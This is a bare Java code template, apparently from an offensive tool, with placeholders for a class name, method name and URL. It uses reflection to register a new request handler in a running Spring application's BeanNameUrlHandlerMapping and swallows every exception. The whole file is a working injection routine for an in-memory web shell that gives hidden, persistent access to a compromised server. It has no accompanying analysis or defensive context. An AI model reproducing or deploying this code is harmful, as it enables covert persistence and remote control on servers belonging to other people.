try{
    Object o = Class.forName("{{{className}}}").newInstance();
    java.lang.reflect.Method m = o.getClass().getDeclaredMethod("{{{methodName}}}", new Class[]{javax.servlet.http.HttpServletRequest.class, javax.servlet.http.HttpServletResponse.class});

    org.springframework.web.context.request.ServletRequestAttributes requestAttributes = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
    javax.servlet.http.HttpServletRequest httpServletRequest = requestAttributes.getRequest();
    org.springframework.web.context.support.GenericWebApplicationContext webApplicationContext = (org.springframework.web.context.support.GenericWebApplicationContext) httpServletRequest.getAttribute("org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE");

        org.springframework.web.method.HandlerMethod handlerMethod = new org.springframework.web.method.HandlerMethod(o, m);
        org.springframework.web.servlet.HandlerExecutionChain handlerExecutionChain = new org.springframework.web.servlet.HandlerExecutionChain(handlerMethod);
        org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping handlerMapping = webApplicationContext.getBean(org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping.class);
    java.lang.reflect.Method registerHandlerMethod = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(
            "registerHandler",
            new Class[]{
                    String.class,
                    Object.class
            }
    );
    registerHandlerMethod.setAccessible(true);
    registerHandlerMethod.invoke(
            handlerMapping,
            new Object[]{
                    "{{{url}}}",
                    handlerExecutionChain
            });
}catch (Exception e){}